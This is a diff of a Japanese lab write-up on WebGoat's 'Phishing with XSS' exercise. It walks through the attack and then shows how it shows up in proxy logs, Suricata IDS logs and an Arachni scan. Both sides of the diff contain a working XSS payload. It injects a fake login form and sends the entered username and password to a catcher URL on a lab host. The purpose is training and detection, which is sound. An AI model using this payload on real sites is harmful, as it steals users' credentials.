@@ -54,39 +54,39 @@ ie) http://target.server/searchform?Input=test&SUBMIT=Search
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/flow.png" title="学習の流れ">
 
 ### Steps
-   1. ｢Phishing with XSS｣ページを開き、｢Search｣フィルドに作成した｢有害スクリプトを含む認証ページ｣を入力し、「Search｣ボタンをクリックする。   
+1. ｢Phishing with XSS｣ページを開き、｢Search｣フィルドに作成した｢有害スクリプトを含む認証ページ｣を入力し、「Search｣ボタンをクリックする。   
   
-   <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step1.png" title="Step 1">   
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step1.png" title="Step 1">   
   
-   2. 表示された｢認証ページ｣にユーザIDとパスワードを入力し、送信する。   
-     ex)
-     ``</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.33.10/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>``   
+2. 表示された｢認証ページ｣にユーザIDとパスワードを入力し、送信する。   
+ex)
+``</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.33.10/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>``   
     
-   <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step2.png" width="270" height="240" title="Step 2">   
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step2.png" width="270" height="240" title="Step 2">   
   
-   3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    
+3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    
 
 ### proxyサーバログの検知
 vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log
 [18/Jan/2018:13:02:12 +0000] "GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> HTTP/1.1" 200 0 "http://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
 
-http&#58;//<span></span>webgoat.cyexc-target/WebGoat/start.mvcへのGETリクエストでuserとpasswordの値が漏れていることがわかる。
+http&#58;//webgoat.cyexc-target/WebGoat/start.mvc　<span></span>へのGETリクエストでuserとpasswordの値が漏れていることがわかる。
 取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/proxy.log)
 
 ### IDSログの検知
 vagrant@www:~/apps$ cp /var/log/suricata/http.log .
 01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)
 
-IDSのhttpログからも、http&#58;//<span></span>webgoat.cyexc-target/WebGoat/start.mvcでuserとpasswordの情報が漏れていることがわかる。
+IDSのhttpログからも、http&#58;//webgoat.cyexc-target/WebGoat/start.mvc　　<span></span>でuserとpasswordの情報が漏れていることがわかる。
 取得したログはこちら＠[http.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/http.log)
 
 ### WEBスキャナー（Arachni）の実施
-どのような脆弱性がhttp&#58;//<span></span>webgoat.cyexc-target/WebGoat/start.mvcに存在するのかWEBスキャナーを実施する。
+どのような脆弱性がhttp&#58;//webgoat.cyexc-target/WebGoat/start.mvc　　<span></span>に存在するのかWEBスキャナーを実施する。
 *NOTE: DockerネットワークにDNSサーバを置いていないので、WebGoatのdocker IPアドレスを使ってスキャンを実施する。*
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/scan.png" title="Archniスキャン">  
 
-http&#58;//<span></span>webgoat.cyexc-target/WebGoat/start.mvcに対して、*Unencrypted password form*や*Clickjacking*を検出している。
+http&#58;//webgoat.cyexc-target/WebGoat/start.mvc　　<span></span>に対して、*Unencrypted password form*や*Clickjacking*を検出している。
 取得したログはこちら＠[index.html](http://htmlpreview.github.com/?https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/arachni/index.html) 
 
 ### proxyサーバでHTTP通信をキャプチャ
